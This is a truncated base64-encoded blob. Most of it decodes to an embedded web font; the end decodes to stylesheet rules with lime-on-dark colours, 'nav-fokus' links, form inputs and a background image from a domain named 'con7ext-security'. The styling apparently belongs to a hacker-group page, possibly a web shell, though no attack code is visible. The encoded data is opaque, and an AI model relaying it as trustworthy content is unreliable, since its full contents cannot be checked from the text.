3ZnVmswK1FpZ3pwbFVqVkNrT1UxV0VWYUN2bGJvNnFYMUVDRm0rT3FVWVRGNU1DVmJEZGdscGxoTnRnQ1pxSkpOR0o5U2lpZUtnY0FLdGJCQ0tUaXpZU3RvcXpNN1p3Z0wxRmpNSEZUL1BQVVdVeU44YTI3aEJhdjBHbFBsNFJOWDZUYkdYMU8zTVd3SFdzTENCSml6VjNRZFF3RlZPNDhWTENDY3hmWmpNMlh6ajBTTGRRNHRJS0JGV3FwUk9JdkV6SkJOaFJaRk5qOTVGVnBzMTBTTFhhVkZOdlBaT2RSUTBWVHB1ZndNRmNzcGdxYWtFbkdFUWxOUkx1OWZrS3E1SXZueEpJN2JTbGhETEc5U1JORWtxaUk2WGtZUEt4Skt4Wk0xcWVLcDlDejNCZWNPYUFGQkxRN3hhM09GZEdxODg4cG9XTzN4YUdNV01hUHFYak5Yc1o5WEJheEd3bUJsZ3hSSzBUcnBJSXc1akcyT3NQSVJLK1Fxa3ptN1FDdmtRaVd4bkVETDR3VE1RNnU5QjNGalduVnh5NVNTanNIZWtJQUVsQjRtUmg4VzJGWk10ZmxPeld3TUdSSHM2cVl2bnU3cEE2TVp2blBQbnFFWGpuUjFIWGxoYU0rZU0rNkV1M3RmWDJMaWlWVDRoUmZZcnIyc2NhcEpaQVhiVU1ocVdMVlRwTDZ3YzIreFI5VVkrTElDRTJjK1A2ZUxHb3hOTGdlL2RVbDVHUHhXbW1DcW1hK3RHbVlRQkViWjdLTVhubUJMM1lGd1hLbDdCSUE4bzgrYUZCYWtPTzMxWkZzTUEzVmpKYkczY3I3K2E5d0NYdHJzdm16aHEvaG04L1JzVzhBbEEzbW5mZHhBSDJCZUxZUzlFT2ZwNUxab3ZsMkdZVFczTm03VlZsWlIxSENOemR6c29LVVdidWcyQUhycnFrM2QyT2RVWmZhL2duWWZjV3NYcG4wLzZybXJFKzlVbEYrUjloT1U5dkFDdEZmUFIzdms5NllkWTBJTEV4K2tTdkhxMUFlbjdiZEMveTFBdjhqVTRwNWZTbitxU0g4V2xHU0U3cXdZWDFvUndScDF6VlNUL1dVd29HVzBselVkRUxiVVg4YlEwS1cwUXNoYlBWcFJHVmMycFk1TGptQzVtMGczaGpybUdlV0NnWTJydFJBOGM1VVYxTDFnZTBIdXgvUEhOaTdON29HblVmblRTK2MzQnVqOHJubG1HRXV1MHlrNUJEWkVUQmFSZXJGSXZqU1dyMVlNUlRXUFc4dnlTZVZiRWtTaFZPRWNvdmlsMVNnS2JyLzJQeU1Ld2dMV1kySHBtR3RPcmk0cHczTnRER0hHbU5QY0FIY1FzK1AyRXBJcG9lM25TOGdZS1MzOGJnc3hFdU9Xd3U5STZaYkN1M0FoQ3pFVDQyYThJcndVZnJ1Wm1BcnZLT3ZtYWU1NWJacnh3SXFQWTEwMzdqdVVJOEJWYkNpdHNEYklUYXFQMFpybDRHTXR1MWw5WUFZV3NjZ3VOeWptSmNJVEJwdFRXMEZicUp1QmV5Vm9teUkyUlNDRHdoTkdzNXRSbnR4SDIrOU10ZHpKdUtlcUxDTDZDUGl1R1lmTFRiREtrcVhXeW9iMXlKU2pneHRpSTJ2cTF5TlRSL3JGUFd2ckdzNmFYV1JmWUgzczBCZjNCRHFpWTRmZFpRbzdNMzMxZTdvdW5VT09ycnF0WVgvbmUrYzJubW5nUWg1SDRkM0xDWjhEMkx2NWJBTzExN1JmSHVnK0QrUEg1eHpNN1poWE1WL0h2SURhTVMvbjlKWXJqeG1ZdjJzZTZ1aDVPdWU5Q2NwNXdlNTVtbDhyaXZtUFRSc2l5L202K3BsUSt5NU1YVU14ZjFHazd3VFFGOERubnM2bHIzSSsrckNZaEdPVUZrQm1ZZHpwOHdmVXJjcmxDeE5MbGU0ODFENU90ZTNDMUxiTnhLUUt2YjFBYjVoSllPYjRTb3B4RTRxWWt2MmdTS0pKMm45U0lYL2N5ekdBTENzVnpURTlsdkdsdk5rd3JWL0UvRklGZTZiVXgzREpUc1BWaEdNQjdUSFBNUGZOMVJzTGovbngrWEFwM2NNQnNzUXpEaVo1WlNjNDUxUW5PSmZhQ1U3VzBDM2xDL2VDUSttNW9oOGNNU2pPOHp4ZDRjaXRpdFNvZldUcGN3a3FtRS9ONlBLTjZVMmlQSjhuci9VcERpdVdIQWVLSGRGbGxrOG1aN1pGcjFUYm90TzZOQjh2S0lFVnJFc29QdXBqVnUvU0pVVC95Ri9XcjNtejBMSjNZbUJnVjh1dWJqSFZ1UzJkYXZGcjNubEZOL0hFN205dWl4YytJRWQ5alhkMk5mV2tIR290TGZia2VsbDdrS2xudnFpaTI4cVUwdU5xTWNoTnJScktJbElEcGJNZVJMMWVlZHlObmFlZERyREtBUFRtZUtrM0J0WjdKWnhmS2RLMlVtdnhDVGoxZ2xxSGtkZUZ4QlcxdUE1VzJtUS9RRnZjdVdIRmh3OHh5azlxaFZ3cFBvT0xEbkZtTDFvTDZFNTFIMzhORzhsVWNFb1ZKZTcwenhSTGFKekNrV1hkbjIvdi8vTWJRNEY0dHN6dlcvbkpXem96cDNQQnB0cVlzZHk0SkYwWDZHclBkTjdXbVZranh0YTFmckw3WnU3ZDNvZnZxQlU3NzhnbU90ZXQ4Z1pqZ1doYVRMUnM3VGp4cUprWGRBL3JiSFpUWjN1bUpTUFdkcXhwM1NoR084WDJ2b1BEbHl5NHptZ3ZOK0FaOW5KYnpneDlYRGUzOUFMZDNGWmMwYzN0Q2V6bWxrajk0ZnU1b1phKzlwNXVNVlRlMTlqWGpmdVJvc3V2NU1ubi8xQThPVTk1a2x5T2t1TzFTYWsvTkdzUXFGODdhL3FwNmJoVzNrU0tHRjdoelFqd0pzS3NZUDVVNVUxc0ZtK1MwN3pKVU40c0J0NG96N3N0OG1ZbDhBYVhTNDRYcXJES3JFYmhUaWdjVWJtekNFT3lLbmVTdng5M2xJVHd0WGNEL0NhMVQzWFgyaE9RKzNZeFlmek9yTzZBUlI0MTBoNTdiZGl2bmZKbzdTd2V0UlI1Qk9Jakx3V1hZZFhTTkNpZENMb01OMUttclFHbXJlSHgwYmhGcHJVRDA5Yk1ZRnFUOENReUxTS202MVN1TFFPdXRhd3RsdjFTZnRGYVJnYzI1WkRTTnFtT3lsclZ4L0p1WWZmaW10bjUyYXM0Rzk1clp2SXI4L3NlMzU3ZGtGR2o4cndPTTJITWFrQTRqNnBjVDh6aStzb3Byc2RFcVRrbGh3RTlOQUI2V0U4NVhnTzZ2Nm9HMGNOaUJTWFU4RFJMcjdCL2ZKMTNPWnlxVTA3VmlmbDFDb0JvUlZHdVVtcEc2NFFuekZxL0k3R1NLcjZWaVFWbTRtTzVQek9yT0l2ak0yTmdWK1grWFVVVXNub1dxNE5Ua09RcVROYzRpMm5IM1ROMXdJRnBqRkxrOXhHcUk1SGYzN3k2bHBSV2lma0dtb0dVbXNYOGNqVVh1WDZtNWt5QXYxZW5aQi9yZUhuZHJFMTJNN1Fxc250ZG5XQjdFaGdkWHVwWXRaeXllbWw0QVZiTHpRMmdnVE9KN0gvV3ppendDTzFyVjdCQlROWGhYMTh4TlhmTjJ2WVFadTU2Tm0zcVNhVFRDY3pSNFRPMko3bFh1SmZBSGpVeU56QVRURzRaNHBzbEtYa2wrTlJWeVp5ZDBLSnBmSzZkdEQ2WjF6WXNzNXRqdUMwZG1iOE9STHlOOGpwdEFvVkQ4Nzd5T3ZnWVNFcnJxSXJCbmcveWpmQ2VudXBGYUFBamJySXZXMGwxeXpwYnpoV3ZWWlJPcm1vSjdRVHFzK1VxRm9YcFkvQldMb04vRlk3RHdRWkJaaGJSTnFFNWd3OGY2eWFaRUJ4Sjlxa05FMVA3OW1ZVURMdmh0VklvSi9xZ1dxMUpOYzZzZWFraEVmb0k4NVF5ZS9XaDVrMU5udHF5OWUzeGJzRm0yNUh1SFF3RXU5UEV3QmIyM2ZHcHhqYVhJWkxJK3BxMlJqS0R0VTJibW9MSEc5YUdPc3JkWlpwb3ZHa2RHZjJKTFJEbXhWWmlxUi9vV2xacUVqZnNwUlBTWEZmWFhDZzNoaXhIajhmSERIYStkRmxVWExLOGMydGozVzFCYjJwM282djdSMjJiMXBUZHEvWUZLRHhPZTZsbXBqQ0NTeitKbVd3UDdndjI2aVp6YWVxZnE4MVYwZW1JejhwUUNsWWFXVVhuUEtobUtFVkJzSTFYUjVOcDVIcFF5SnRjZnEzeXJDZC9IRFIvY0VrU0h3OXY4dEFISVJXZmNMWlFLOVk1R2NxMG1xRWtDelZvYlI3cmRoYzNTMkNPRW5kUkdIeVdpWCtldjJXcng4WEY1NlFvNi95KzMxSWZqdlpDQlJ5RnZWRERIOThOdFhxK2JxaVIvM28zVklTTUg5Y1J0UVdCNGtKZFVka25pN21rLzgrTUNiSGV4NDFwbUNLOEJRZFZvZ1lIaW1NYW9XT0tZQVhBMWNlMGVMNHhSZFV4QVRaWmxQMjlSNFdJN2VPRzVWZkNDQXVPUzVnT0k0Q2RVc1pXUjhjV1o3TE15YXVQRG5GQlJzRUZDVkNhcTBTcDZtSVJEU3hXQXRLekJ6NiszT0FGVkZDakFnYXdiUW9xcUMyaWdsSUV0K01BMDdRS1JwTVRHVmpBaHVWVDAyODBLOWpCSTF3TGk3Z0ZBaEVmeHpYTlBGR0pCVmw0eDVWUmlXTGZWZXdCUy91enpPbTdTcnUwS0ExWFozUmJwV2t3N0xFcWVhNnR3eW9zMWJtZFZZZGhjYzdiVlBYZDZSenZmNVUrOTdYUlozZHI1OUxYaXd0dFhnSmJwdksrQ24walFKOFA0Mi96MEZjK0gzMytZbzlhdC9jYWU5VFNyTzljR3ArbHEyWmVJanRteHQwVU91dG9mOTA0ZG5lZnI4T3VGRXZKSGxnaTRTUU5ON3N1NXNzVitTL242UmJFMllNWXIrSWNVNWlhR3J2RjJGMUZadzNIRnJuLzA0MTN3MWR0d3Z2UGM4VjgvbmE4ODhYZEJ0U2U3bFZNR3V0R0t0VElrWlFTbGNld3JhQkdPMlNrejEvRnNpSVA0TkVNbGhXRkJGdWUwNVhhMFZMalFuYkJzRkxZeTgzREtMdUNkZGxpTXdzM0FCa2FPa2VMVEZ2QzJPWnVXYSttblF0MEEzOXpwbjJYMzdncStucnM2VUM5MkIvZGx2NXA3UHUxbnd6MW50amRkN0JQUE8xTnRTV2ErOUpPTmpVa0RtNG5qMDIrVyt0cjNWOS93OTJOb2ZyUVJ0K2ZOTFlQcnR0VStNZW5OcjE4NW83MmtSUGR0VHU3RW0zM25laUloL2xNemJkb0wxUGEyN21SNXJRK043Zmo2endKcldYenRZQk5ZQlJOVFdpVkNIbU5KeGpCQjBOTEJneUlUVFdGbFplaTkrcFlJaUtHOFdBUHNmS3E3UHl0WWhkS0NjOXVJZHQ5RlI5emJudFp6Wkg1TThKRkczaE8zVXMvSTY4NnEvUHNIeUt2T3UxSlVGaXlZQVBhRFFoSUZtcEN5ejQybFEvK24wODNoUjRMMHYxWkNqb1dJcHk4VTR3aktYU1BYSmtMbmtYM0h5SVhQSU51Q2k0V0pOeWd3SW9GS2I4MG5RZFdhRzlVODhEM0ZQUEFSZHF6K3Q4ekQveUVGWmVOVnEybHFQckRwSU92MHUzNDZGVldUOTJDblpDNXlMeXI2UEx1cVE3SlJkeDFEdXhJTVJmOE9aVkxvU0tYb3JUVE9lYUMzYk55d1pYV3lYRkhKUVpodklwTnFlUnBFUTJ3YXp4cHJJYmpTdUpHV2lxcTZXRWxKK3lsSWhHS1VwSEFzdTBGUkdKdWJFWHRhekVUVEYzSnFZZUxac1V6eFphbUtSZzFoMEhiVktOeU9WTmNyOTJ6ZWhMMU02M2NLVzZTOXNMdzRaNTZzeWpyUzRvZHpPbld5QklGRUdndVNueFNObUsvK2lSdHM2cytlWHlCQjdYM2M4MlhmOXFVU1RjMnBqTk54WGZ5eXRoWTRlMVVXMXNxMGJxZS9YOVQ2OWVuRW0wM0tHdndHZTRjOXg3alpSWUJGZHZWdlBMaTRneFY0UnBVTmh6NHJMUy9jVXpOSmkvRGdJSGFFaUVtUEtHM09iVktmMk96MGc1eE1mYTNkbUttdVFwenlXVk1SWTJTUzRaaFp1Zk5KbGRma1U3VzJZdWJYQ04wTWc3ZDFyMmhQNUhCK1dpNmQzbDNmNStZT1dleGs3djhOOFNHRHV6d3I0L3RPZ2hmNlV5MERyV08xcC9aaHBNUkNRMjFqalNlMlZwL1M1Uzg0M0ZORkJJZXg4VEo3Slpvc1EvWW0vUTVJNGdaMTgzWFZkZzdYMWRobjlwVk9DZTR5cWluYzlYT3dxamw1M1FYZmc2Viszd2RocmwvS3VhVFo5TFcrcCttYlZ4d3VUM0ljb3NnbFgwY2lhalE1NUJJaTJ2bnB6Rlp6QThxTkNxWXRtTStHc3ZubzlGZnpDbTdhTEcxNFBiUUJub1cyelZRaWlwOERxbDdGTTA5TDYyclptSmJoZDRpdHIxN0xzVnpvYTJhVTNiUm5ITDVWRTVaSGN2NFlrc3BISzlTamxlSk16RXVOcStDMFh5OGdDeUFiZWNNczI4ZUQyN2VNVDgwSDdhbHZYVkJuaXBocmMvYlhUYzgxVjIzK245NWQxMU1XSDlzaDEwU1JCSDltRDY3Mmllb3NLbzkrMkg4RGtBYjNlcnptc3FLejJ1cVVudjJxNEFERTlqT1pCSlJoMTk5YUJPaURyOWo2cUZOWlpqQ3RxTjZtL0hRSnZ1VkQyMmEwYmUvK055bTJwMHJ1by91cUp2ZHVUKzg3dVowZXNPS3dqbmRzK1VGUThEWE5QclVyaXZiOS9mczY0NkZxeFQ3b2N4bEhjemxVbVlsOC9MYzJjUmQ5U3RTOGlLUTQyVkorbUQ1NE1WOFJKSFNpUEtZVjVqbzhaVExDZEliVjQ3SHhYeEtrZDVWZjRUNWx5TkJKUllTeDhmaWdHRncydVJsSzJnL2wvK0VYQ3kwVmo1V1ZzN09YVHNmSXpnNjk5d1lTT2FqZDdqWHRRem9qMFdJWjJnWElROUhPMlZ5eXJNUTVVb09PMVRsaldZN2JwRXhxZ3NMSDRkaXhzZ3diU1prTWRQQ2FrczU3VnRsQWk4ZjhVMDV0dHpsN0ZtcXMzR3ZrQm03R3BSVHhqRDRKSkJLbStSSDl2QTJSSG96OXRIb3NQcHFWdklpODZOdnVldkt5ZjNxbnByZTJzejVpNmVHQnFPTDliNllMZk9aYklEZFNscEloMEdqbHZDYlNKeGMvK3ZmbVZqdUphTzJkZjkzWitRYklvQndHNWtUVEM2RW5xRS9KY2N4eEoya0NBRTdkMlU0ektEbFZ3c2hqS0N0eHZqZ09pWG5hNkk1WHl5dkVHREFxNU1ZNlVhOGF6Wk4wb3hERXYzamtCWkdKZ2l5b1JMZTYyeTVVaGZOR1ppRkhJOFBpQVUyb0crTlNXRDRrUWQvdE5vMnpwZ1hKOUZrWklSWiszTnc3U2s1aEJsUEhKak9Jc3h1QnhkT1VkUlhIMWl6c2FudHMvN3d4dHIzMk1LWDNiR211SzlPZEVYNzR5MzNSVVA5M1UwYkdnSW5MQUV4RkloNlM4M2xZakFROTVuSWczK1hqcVpxeVUvNnhnOTJkZCsyNFRPRmNsTzVQYnVqSzhYN3gveWVqbTM5TjNVL2tOL1U5S2RiNnJLMzN0ZllPTHFwdnJaL2oyMzNvU1BLK2xYcWUzb1pubmFsSFpwZDRZT0d2VG9sT3d4WVgwNDcxQ3JsUHVOdUU5WXZDY3BxRmNTOFd5bWs5OVBESVdYcDBuSS9mT1MxQTVoSEhTTkprNVZEV0ZwZldYMzFJcUdGMXRZVmhVUDc1dHNKTWw4VjBmTlhyaDlDREpvbyt4N2dCUzE0QkpKV2xMalVWQnN2WGJHTlY0bEdhWGNvRTYxS3FiS1BnU2orbVdiM2xFRW56TTgxR3prZitHRStrRkhKVGx2NmpwY1o3ZUJ4YVRXVEt2cklXNVFHZXZRWkZXVllpSStMaVhabWtnMldHVzJ0NTdoT1A3OWF1ZmtDa1lTWi9SaVpXZDBXbWQvL0hIT0kvSXdiWkFlVjV6c3FUb0x5cUtPcDV6dWlVM0NJL1FYNTJlSEQ4SHVHL0V6RFhQWDNBdnhldzlDZnc3MFQzSGIyWmUwNThOVVdNeWhaMmhKa21mcXdIMlFnZHZSQ28yRmhxQkpubEE2QnlLM3BUbThKc2YvQkRZRndTMTNDMmxqYm4yMXIxNFJyUndjNlRQc01Ra1Vpb3Z0TXJMTnJCOXhMNURheEwybFBLL2V5aS9uUzZYc1padDlMMlQrSjl3SVRNTDFMMHNMcWlUampOdUt0WXh2K1IyVlhFOXJHRllUMzdWdXQxcElzVzdGK29raUtvOGp5NGdwcDBXNk5JMHRFamxxRUNOUUlJNFFqU2pEQk9ERnFxeFkzOWtHWWtJaFNTaWltdEFXMzlGQktEMFg0SUJrVFJBbUJVRW9nVUh3b0RaZ2NldWlodUFVZlNnK2xjVGQ5ODk3SzJzcEpTdy9MTGdOdlorYnRtNTE1UC9NTjNwZGNvOHFFT0E5TVhrbmZlck00Q0hvcCtoNy9IUXI5SDE2Vy8rVDFoWW5WTE5XUXhsZnp1SUdiZEIxRzVnb2NqT2RUR29Bd0FuYVlYNldiSnVTbjZMUURkaHRkSXoxclozVmlvRS9ia2owRis5VnRpMGdSbDlyQlVYWVdzYitYby8yRStVanhuY1ZRNU1KMDNKSE81UExwTXRvektPZUE4dkpMNlV1Q2tscTVuSGVzU2M1UUxDb1drMXBwcm5LTVFuVW9FeDIrNnVrd29yUmtEU0RQVklxa1JYV1FqblFJbW5VZy9kZm00VmNlZExYZE10UEI2MmM2OVBkb3RKOVFOZ2tMd3FPN0puMEk0UXIrazBnYWp3cHpDc2llZnN1US9aOFVrRi8vRFRlNVB6Z1hpZkh5TUpKYjBTUDVUNmcwdkJQSnY1VEk3MkRyU1dmc0xMSno5SkRBVGtTcHEyMjdmVlI2SDkwdC9WZnA4MjhIVExMZmkrUlNKdGtYTjUySmdsZ2tZaGFabUt2U0VPMzBIb1h0SmUraks5aUh0MGpmSnlpU0o3RkJxeEF6YmwxVHRORi9tWEdEa2NzZFg5L1lsd3RMdWV4eVFaWUx5OW5jVWtIbTMwMVY1eFE0SHBpdUZoV2xXS1UrS1B2MFozeWYrOWJJK1NweDJ3TVF6WGpDbXJhREpXNkV2SDRvb0txVWFoQ01kY1Jud2pWRGdhdGV4aUdzTFJMSnBwN2pVY3pQMlV3eW1ZRUxYU0loMi9SME1wbENwZTVUT1o3THhaOXhnVzNMM0FyL05mNk0rQkl2WjNJZmRxR0xsanRBRVhtUmpFS3JEeCt1OGhMNmFFYmYwcmN1a0xaNTBuYVB0ZzEzMjdaNGRVYzRhazVybkxRUURBQUFzeHNnVGNnN1VFai9hUWVWVUdsR2YwMnZRcjBTMG9kM0xUWXVDWWltQ1hvbW44d29uSERPMUlNQk56L2hISXhCeGh3VWw0aVFxSENBRWs1cDRLbGFKOW1wWmN1ajlta3k2WUpqeUtjdFVQMGxTZjIwVEFSNElkWDIyR2lpRmMwT0czOXhNb09tSXBNYU96TEJFS0d0WVd0WWRIdUN5RWNlVER1RzQvTEZkWjVmMzRqKytzM2NOVFVjVzU2NjNmQ2dUYjllNDNuMHhrbTlFL2k0UGx1TGpZMStjdm1ISDBQbzg0WTc3Z3NvM3NiZTkrNlJqV0hQcHpjYnZrVEFGM2MzdnJ3UjhINHdQUDdMTGxzemlmS1A4YTd3TzJjbE1mQXRWcW00UFRpc2FRWTBZZ3VyWFRoaktMNGxlVldXTkNmMjBCTEZibG5uYlpHaUpZcVFNV2RoV0FRRzF0b1lSUi9ZOFRLY1dvaU94eVNhL0FsSXBFNWFLSlBtMHpQSEZ5SHhDOFdBRENDWU1FUkloQ2RiSTdJVGU2Sm92YkdHd3FMRE9XU3JWUlpxTnFmRExxN3h2TUNYWHkwS0FvK0Y5NjllMVdmUnRqNjd0Rm0vZGs3ZlI3NnBhbjF6VWFwY3IwOGNIRXpVcjFja1pwOWdOQjNjSVpZamQwOUMwMktIREg4VTI2bTFzcHZoWTVPdXNBdWFIQmJBM2xLUSswdnJKWjdseGptTzFqeUFtZ0RzSzRhUXh0UXdMMDY2TkZmcTlWWm5RZlc3RlhtbGNualk1T1BadURJem84U3ovaWJVSnUwOGNId29pVGRyckN3cGFtcVpqS2FkUC85a0FkODV2TWkrVitycEFUNHcrRDZYSzVtNGt2QVlxUDBNdGFiTlB6SHF1NzF5bk4xZnU4SmE4TWw3c2Nud3NMZ2gzUGdiMTR0TFh3QUFBSGphWTJCa0FJSXpad3puclhrY3oyL3psVUdlQXlUQWNPNk02azBFL1c4SkN3UGJFaUNYZzRFSkpBb0FtNllOU0hqYVkyQmtZR0JiOHJjSVJESUFBUXNEQXlNREtuZ0JBRkZjQTdKNDJuV1RzVXZEUUJUR1gxb1JSK21hb1lNRUJ3Y1J3UkpFQWlJZGdoUUpSUnhLaHVJZ0xpVklFY2ZnNEJDa1pIRndGQkZjSEJ5S0ZQOE1OMmNSd2NsWnhPL2RmY1Y0YU9ESDkvSnlkKy9kZDVmYXUyd0pucGxmZUVkZ0RuRUxERUFBSXVSdW9LOWtDRkxrVmtBVEhPTDkzT2Jra3Q5UFFBek91RTRPRGl3NjN0TjYrNXlqK2dnUzBPRDRsRG9oK3Q0RFkrWlBtZDhFR1ZnSEY5U003SUErOERsdWxUSG1lN3F2RWZoZzNYbmtPdEJqVUxLbmhPVFVrclhMU3R4bG5GVDBtZnZXZVFYWUFJdnNMV2FmVjZoM3ozaWIzZzlaVi9mWnNiMmFNUVY5YjdQZjNOWlY3MDN1azM2cVIxK0lhNkRIZmtMNkhkbTg4ZStPNTdvQWx1aDk0eDlhWEhmaU1IWUlLdWZnTXFMMkhYenV2NlR2ZnhFNVp6Rmw0SkJWL0hkSnFZVkR6RGt4OXhuUmM3My9ML1ZFWlBaYVpLcTFOUkh2RnZnV2VZSjJvYWs1dStZUDVsOFEvaC9MRnRrRHUrUk5hK2xjZk1POThOcTZMdnNJNmc4bURpWDhCdUhxWHdaNDJtTmdZTkNCd3lxR0xZd3ptSXlZcmpFWE1NOWlQc0w4Z2NXSHBZL2xDTXNqVmhGV0Q5WjlyUC9ZQ3RpZXNkdXd2K05JNGxqQXFjWTVqZk1XbHhxWERWY2NWd25YSSs0eW5pU2VON3dPdkZONEwvQ3g4Ulh4cmVKN3hLL0VuOFRmSWNBaDRDVXdUK0NEWUlUZ0NTRW5vU0toYmNMSFJHeEVxa1MyaUx3VGxSTDFFNjBRblNhNlR2U2NXSURZR3JGLzRqSGkreVFDSkk1Sjhram1TVjZRNHBNS2t0b2o5VWZhVDNxTkRJK01pOHdHV1E1Wkg5bHRjcnZrZnNrWHlhOVFFRkV3VUppajhFUGhoNktiNGpZbEZhVTV5aHpLZXNxUFZGUlV6cW42cWVhb1RsSGRwRmFpTmtudGhicVplbzhHaDRhR1JwWEdNWTB2bWxhYVRacFhOTDlvVldqemFUL1JDZFAxMC9QUWR6SElNcHhrdE0yWXozaVM4UTBUT1pNc2t3ZW1hcVk1cHR2TWpNeFdtZXVaOTVpL3N2Q3l1R1daWXRsbXhXVVZZYlhDbXNHNnp2cVFqWlRORmxzNzJ6TjJjZllTOWhjY09oeURIQjg1K1RodGMxWnhQdUVpNFpMaHNzZlZ5bldMbTRYYkZMY1A3bjd1RHp6eVBEWjVHbmsyZUY3eTB2SmE0YTNoM2VmajVYUEFOOC8zbForUVh3d09tT1ZYNGRmbU44OXZtOThiZnlYL0NQOWRBVklCRlFFYkFnV0FVQzh3Q0FqUEJIa0VaUVF0Q2JvRkFHUWJscU1BQVFBQUFPa0FUUUFGQUFBQUFBQUNBQUVBQWdBV0FBQUJBQUhFQUFBQUFIamFuWks3U2dOQkZJYi8zY1JMVUlJUkNSWWlVNGlkbTQxRzBGU0NRU3pjUnZEU2JpN0dZQzZ5R1JIQndtZndDU3g5QXA5QndjcktKN0gybjltemlzRkVDVU1tMzV6em44dk9IQUE1dkNFRko1MEJjTTlmekE3eVBNWHNJb3RINFJSMjhDU2N4aW8raENldzZDd0pUMkxGS1FsUDRjNDVGWjdHc3ZNdW5DRW5zVE1vdVF2Q3MrUjk0VG5rM1Z2aEhMSnUwczg4N1EvQ3orU2tueGY0N2l0MjBjTWxiaENoaFNiT29hR3dEaDlGTGtWdmlDNFZYWHByNURadEI5VFU0WkVNRzN1RC9qNzNPaTFYNURvNUltdm1hL0QvQ0ZWcjE5d1Y5bXcrL1NPNlpuVkZadlVIMUlGVjkzQklSWk9XTnJ1SWhtalVnRXJoMkhiU1p4MmpVTXp1WVd0b2pjSDQvMFFuc1dzak93enRyZngrbjBadHZqNnk4UzNXMDdadWZKK2FGTm9iN1ZqbEJmMktHYzcrZUoyS1BXdnBQT0FwWlBiRVA5cHJwa0J6S3Nvb2NGM2I1ZEgrSGRPUkNJOTFlendWeG9vWi82VlBxS255RHBKSmlpY25rTytwMEZ1ejg3a3QwMXpHSmwvTzdQN1hmRzk4QW90T2xsd0FlTnB0MEVWc0ZIRVV4L0h2YTNlNzdkYmRLZTR5TTl1cDRMdHRCM2QzQ3JWRld0aXl1SWJpRWdnSk53aDJBWUpySU1BQkNHNUJBaHc0NCtFQVhHSGErWFBqSlMrZnZQL2g5MTcrUk5CU2Y5eDA1bi8xeVc2UkNJa2tFaGR1b3ZBUVRReGVZb2tqbmdRU1NTS1pGRkpKSTUwTU1za2lteHh5eVNPZlZoVFFtamEwcFIzdDZVQkhPdG1idXRDVmJuU25CejNwaFlhT2dZOUNUSW9vcG9SU2V0T0h2dlNqUHdNWWlKOEFaWlJUZ2NVZ0JqT0VvUXhqT0NNWXlTaEdNNGF4akdNOEU1aklKQ1l6aGFsTVl6b3ptTWtzWmxNcExvN1N4Q1p1c0orUGJHWTNPempBY1k2Sm0rMjhaeVA3SkVvODdKSm90bktiRHhMRFFVN3dpNS84NWdpbmVNQTlUak9IdWV5aGlrZFVjNStIUE9NeFQzaHEvMU1OTDNuT0M4NVF5dy8yOG9aWHZLYU9MM3hqRy9NSU1wK0ZMS0NlUXpTd21FV0VhQ1RNRXBheWpNOHNaeVVyV01VYVZuT1Z3NnhqTGV2WndGZStjNDJ6bk9NNmIza25Yb21WT0ltWEJFbVVKRW1XRkVtVk5FbVhETW5rUEJlNHpCWHVjSkZMM0dVTEp5V0xtOXlTYk1saHArUktudVI3d3ZWQlRkUEtIWFdsWDFPcU9XQW9mVXBUV2Rxc1lRY29kYVdoOUNrTGxhYXlTRm1zTEZIK3kvTTc2aXBYMTcwMXdkcHdxTHFxc3JIT2VUSXNSOU55VllSRERTMkRhWlUxYXdXY08yeU52dzZybVZRQUFIamFQY3c5RXNGQUhBWHdiRlkya2MrTkNTb3pNWFJiYWJRYVNaUEdxTEl6em1GR3AxRnlDZ2Y0UitVU2p1QXNQS3p0M3UvTm0zZG5yeE94czlOUXNHazd4aTY2cTRWcXB5UjFROFVXNGFnbkpOU3VkWWlYRlhHMUpsRldOLzUwMVJjZUlLNEdQY0E3R1BpZjJjTWdBUHloUVI4SXNoOFloZVkyUWh0S1YzVzgzb014R0kwc0V6QmVXYVpnc3JETXdIUnVLY0ZzWnBtRGNtdzVBUFBsbjVvSzlRYmlCa3FzQUFBQlVxWjFXZ0FBKSBmb3JtYXQoJ3dvZmYnKTsNCiAgICBmb250LXdlaWdodDogbm9ybWFsOw0KICAgIGZvbnQtc3R5bGU6IG5vcm1hbDsNCg0KfQ0KDQpib2R5IHsNCmZvbnQtZmFtaWx5OiAidWJ1bnR1X21vbm9yZWd1bGFyIjsNCmZvbnQtc2l6ZToxMnB4Ow0KYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsNCmJhY2tncm91bmQtYXR0YWNobWVudDogZml4ZWQ7DQpiYWNrZ3JvdW5kLXBvc2l0aW9uOiBjZW50ZXI7DQpiYWNrZ3JvdW5kLWNvbG9yOiMyZDJiMmI7DQpjb2xvcjpsaW1lOw0KYmFja2dyb3VuZC1pbWFnZTogdXJsKCdodHRwczovL2NvbjdleHQtc2VjdXJpdHkuY29tL2ltYWdlcy9lcm9tYW5nYS5wbmcnKTsNCn0NCiNuYXZ7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDo5OTk7dG9wOjA7d2lkdGg6MTAwJTtsZWZ0OjcwJTsNCn0NCmEubmF2LWZva3VzIHtkaXNwbGF5OmJsb2NrOyB3aWR0aDphdXRvOyBoZWlnaHQ6YXV0bzsgYmFja2dyb3VuZDojMTkxOTE5OyBib3JkZXItdG9wOjBweDsgYm9yZGVyLWxlZnQ6IDFweCBzb2xpZCAjZmZmOyBib3JkZXItcmlnaHQ6MXB4IHNvbGlkICNmZmY7ICBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZmZmOyAgcGFkZGluZzo1cHggOHB4OyB0ZXh0LWFsaWduOmNlbnRlcjsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IGNvbG9yOnJlZDsgbGluZS1oZWlnaHQ6MjBweDsgb3ZlcmZsb3c6aGlkZGVuOyBmbG9hdDpsZWZ0Ow0KfQ0KYS5uYXYtZm9rdXM6aG92ZXIge2NvbG9yOiNGRkZGRkY7IGJhY2tncm91bmQ6IzE5MTkxOTsgYm9yZGVyLXRvcDowcHg7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2ZmZjsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjZmZmOyAgYm9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjsNCn0NCmlucHV0W3R5cGU9dGV4dF17DQoJYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IA0KCWNvbG9yOndoaXRlOw0KCW1hcmdpbjowIDEwcHg7DQoJZm9udC1mYW1pbHk6SG9tZW5hamU7DQoJZm9udC1zaXplOjEzcHg7DQoJYm9yZGVyOm5vbmU7DQp9DQppbnB1dFt0eXBlPXN1Ym1pdF0gew0KCWJhY2tncm91bmQ6IGJsYWNrOyANCgljb2xvcjp3aGl0ZTsNCg